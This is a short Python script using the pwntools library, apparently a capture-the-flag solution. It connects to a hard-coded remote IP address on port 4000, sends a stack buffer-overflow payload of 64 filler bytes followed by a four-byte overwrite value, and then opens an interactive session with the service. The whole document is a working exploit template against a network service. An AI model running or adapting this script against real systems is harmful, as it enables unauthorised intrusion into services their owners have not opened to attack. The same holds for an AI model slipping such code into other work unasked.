from pwn import *

submit = remote("139.144.184.150", 4000)

payload = "A"*64 + "\x41\x42\x43\x44"

submit.recv()
submit.sendline(payload)
submit.interactive()
